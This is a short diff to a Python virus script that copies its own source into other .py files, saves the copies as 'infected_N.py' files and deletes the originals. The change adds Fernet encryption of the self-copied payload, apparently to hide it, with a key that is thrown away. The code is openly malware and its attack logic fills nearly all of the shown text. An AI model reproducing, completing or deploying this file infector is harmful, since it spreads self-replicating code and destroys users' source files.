@@ -1,5 +1,7 @@
 #!/usr/bin/python
 import glob,os,hashlib,winsound,re
+from cryptography.fernet import Fernet
+
 
 #### t45r6fye
 FREQ = 2500  
@@ -32,7 +34,7 @@ def infect(PAYLOAD):
         if f.mode == 'r' and x == None:
             f.seek(0)
             infected = open('infected_'+str(i)+'.py','w')
-            infected.write(PAYLOAD + f.read())
+            infected.write(str(PAYLOAD) + str(f.read()))
             f.close()
             infected.close()
             os.remove(file)
@@ -45,6 +47,14 @@ def infect(PAYLOAD):
 with open(__file__,'r') as current_file:
     PAYLOAD = current_file.read()
 
+
+
+
+
+PAYLOAD = PAYLOAD.encode()
+key = Fernet.generate_key()
+obj = Fernet(key)
+PAYLOAD = obj.encrypt(PAYLOAD)
 
 
 infect(PAYLOAD)
